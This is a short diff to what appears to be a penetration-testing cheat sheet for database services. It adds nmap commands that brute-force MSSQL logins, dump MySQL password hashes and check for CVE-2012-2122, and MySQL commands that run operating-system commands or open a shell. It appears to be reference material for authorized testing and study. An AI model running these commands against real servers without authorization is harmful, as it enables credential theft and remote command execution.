@@ -1,4 +1,12 @@
 * nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt IP
 * nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password IP
+* nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip -p 3306
 
 * Looking for metasploit modules - https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/
+
+> Nmap Scan
+* nmap -sV -Pn -vv -script=mysql* $ip -p 3306
+
+> If Mysql is running as root and you have access, you can run commands:
+* mysql> select do_system('id');
+* mysql> \! sh
